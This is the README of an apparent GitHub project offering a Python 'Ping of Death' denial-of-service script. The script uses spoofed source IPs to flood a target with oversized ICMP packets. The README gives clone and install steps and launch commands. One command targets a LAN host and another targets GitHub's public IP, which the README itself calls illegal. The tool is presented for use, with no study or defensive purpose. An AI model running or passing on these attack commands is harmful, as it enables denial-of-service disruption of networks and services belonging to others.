# ping of death

This Python script is designed to execute a "Ping of Death" attack, a type of Denial-of-Service (DoS) attack that overwhelms a specified target IP address with large ICMP packets. The script employs IP spoofing to mask the source IP address, making it more challenging to trace the attack back to its origin.

### install

```bash
git clone https://github.com/savasick/pingofdeath.git
cd pingofdeath
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

### usage

send to router-IP
```bash
sudo python3 pingofdeath.py
```

send to 192.168.5.110-IP
```bash
sudo python pingofdeath.py 192.168.5.110
```

send to GitHub's IP (not recommended and illegal):
```bash
sudo python pingofdeath.py 140.82.121.3
```